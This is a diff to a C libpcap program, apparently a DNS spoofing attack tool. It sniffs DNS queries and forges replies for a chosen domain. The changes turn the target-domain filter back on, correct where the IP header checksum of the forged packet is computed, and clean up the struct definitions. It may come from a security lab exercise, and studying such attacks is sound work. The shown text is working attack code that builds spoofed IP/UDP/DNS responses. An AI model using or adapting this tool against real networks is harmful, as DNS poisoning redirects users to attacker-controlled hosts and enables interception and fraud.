@@ -131,22 +131,23 @@ struct arp_header
 
 struct ip_header {
     u_int8_t    ip_vhl;                          /* header length and version */    
+    #define IP_V(ip)    (((ip)->ip_vhl & 0xf0) >> 4) /* extracts the IP version */
+    #define IP_HL(ip)   ((ip)->ip_vhl & 0x0f)        /* extracts the IP header length value */
     u_int8_t    ip_tos;                          /* type of service */
     u_int16_t   ip_len;                          /* total length of the header*/
     u_int16_t   ip_id;                           /* identification */
     u_int16_t   ip_off;                          /* fragment offset field */
     #define IP_RF 0x8000                         /*reserved fragment flag*/
     #define IP_DF 0x4000                         /*dont fragment flag*/
-    #define IP_MF 0x2000                         /*more fragment flag*/    
+    #define IP_MF 0x2000                         /*more fragment flag*/
     #define TCP_PROTOCOL 0x06
-    #define UDP_PROTOCOL 0x11                    
+    #define UDP_PROTOCOL 0x11
     u_int8_t    ip_ttl;                          /* time to live */
     u_int8_t    ip_p;                            /* protocol */
     u_int16_t   ip_sum;                          /* checksum */
     struct  in_addr ip_src, ip_dst;              /* source and dest address */
 };
-#define IP_V(ip)    (((ip)->ip_vhl & 0xf0) >> 4) /* extracts the IP version */
-#define IP_HL(ip)   ((ip)->ip_vhl & 0x0f)        /* extracts the IP header length value */
+
 
 struct tcp_header
 {
@@ -184,7 +185,7 @@ struct udp_header{
     u_short udp_checksum;           /*UDP check sum*/
 };
 
-struct dns_header{
+struct dns_header {
     u_short dns_trans_id;                           /*transaction id*/
     u_char  dns_flag_h;                             /*DNS flag high 8bit*/
 #define DNS_QR(dns) (((dns)->dns_flag_h) & 0x80)    /*DNS type*/
@@ -204,13 +205,13 @@ struct dns_header{
     u_short dns_er_num;
 };
 
-struct dns_query{
+struct dns_query {
     u_char *dname;              /*domain name*/
     u_short type;               /*domain type*/
     u_short class;              /*domain class*/
 };
 
-struct dns_response {     
+struct dns_response {
     u_short         offset;                     /*offset for the DNS response part*/
     int32_t         ttl;                        /*time to live*/
     u_short         len;                        /*data length*/
@@ -497,12 +498,13 @@ int Handle_IP(struct attack_opt *attack, const struct pcap_pkthdr* pkthdr, const
         if (ip_hdr->ip_p == UDP_PROTOCOL) {
             printf("Its an UDP packet\n");
             offset = ETHER_HDRLEN + sizeof(struct ip_header) + sizeof(struct udp_header) + sizeof(struct dns_header);
+            //offset = ETHER_HDRLEN + IP
             // only handle the DNS packet if its domain has to be forged by us, otherwise do nothing
-            //if(memcmp(buf + offset, dns_request_dname, strlen(dns_request_dname)+1) == 0) {
+            if(memcmp(buf + offset, dns_request_dname, strlen(dns_request_dname)+1) == 0) {
                 printf("Ah, here comes our DNS query! Going to handle it\n");
                 Handle_DNS(attack, buf, packet_length);
                 return ;
-            //}
+            }
             //else
                 //printf("Some other DNS packet\n");
         }
@@ -570,17 +572,19 @@ void Handle_DNS(struct attack_opt *attack, u_char *packet, size_t size) {
 
     // build the IP header
     memcpy(ip_send, ip, sizeof(struct ip_header));
+    //ip_send->ip_vhl = 0x45;
     //printf("IP header copied\n");
     //ip_send->ip_len = htons(ntohs(ip->ip_len) + sizeof(struct dns_response));
+    //
     ip_send->ip_len = htons(sizeof(struct udp_header) + sizeof(struct dns_header) + strlen(dns_q->dname) + 1 + 2 + 2 + sizeof(struct dns_response) + 20);
-    printf("dns_response is %ld\n", (long)sizeof(struct dns_response));
+    printf("ip_len is %ld\n", (long)ip_send->ip_len);
     ip_send->ip_id  = htons(0x5555);
     ip_send->ip_off = htons(0x0000);
     ip_send->ip_ttl = 0x37;
     ip_send->ip_sum = 0x0000;
     memcpy(&(ip_send->ip_src), &(ip->ip_dst), sizeof(struct in_addr));
     memcpy(&(ip_send->ip_dst), &(ip->ip_src), sizeof(struct in_addr));
-    ip_send->ip_sum = Calculate_Checksum((u_short *)ip_send, sizeof(struct ip_header));
+    //ip_send->ip_sum = Calculate_Checksum((u_short *)ip_send, sizeof(struct ip_header));
     printf("IP header built\n");
 
     // build the Ethernet header
@@ -660,6 +664,7 @@ void Handle_DNS(struct attack_opt *attack, u_char *packet, size_t size) {
 
     ip_send->ip_len = htons(size - b_udp + 20);
     printf("ip_len is: %ld bytes\n", (long)(size - b_udp));
+    ip_send->ip_sum = Calculate_Checksum((u_short *)ip_send, sizeof(struct ip_header));
     memcpy(buf + ETHER_HDRLEN, ip_send, 20);      // copy the UDP header
     //size = size + sizeof(struct dns_response);
     printf("Calculated size: %ld bytes\n", (long)size);
@@ -674,15 +679,18 @@ void Handle_DNS(struct attack_opt *attack, u_char *packet, size_t size) {
 
 u_short Calculate_Checksum(u_short *buffer, size_t size) {
     u_long cksum = 0;
-    while(size > 1) {
-        cksum += *buffer ++;
+    printf("size of ip header: %ld bytes\n", (long)size);
+    while (size > 1) {
+        cksum += *buffer++;
         size  -= sizeof(u_short);
     }
-    if (size)                           // if the checksum is odd
-        cksum += *(u_char *)buffer;
+
+    if (size) {
+        cksum += *(u_char *)buffer; // if the checksum is odd
+    }
     
     /* add the carries to the LSB 16-bits*/
-    while(cksum >> 16)
+    while (cksum >> 16)
         cksum = (cksum >> 16) + (cksum & 0xffff);
 
     //cksum += (cksum >> 16);
